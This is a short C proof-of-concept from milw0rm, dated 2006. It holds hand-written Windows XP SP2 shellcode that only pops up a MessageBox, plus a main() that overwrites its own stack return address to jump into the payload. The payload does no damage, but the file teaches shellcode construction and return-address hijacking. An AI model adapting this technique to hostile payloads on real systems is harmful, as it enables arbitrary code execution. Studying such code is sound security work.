/*
Author : Omega7
Assembly Code : Steve Hanna
Changed by : Omega7
Description : It is 110 Byte Shellcode which Pops up Message Box Under Windows Xp SP2
If you Want to use it in any other Windows You need to change the address
that i have marked!

*/

#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
"\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
"\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
"\x28\xac\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
"\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
"\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
"\xff\x4f\x6d\x65\x67\x61\x37\x4e";

/*MessageBox shellcode for Windoew xp sp2 */

int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}

// milw0rm.com [2006-01-24]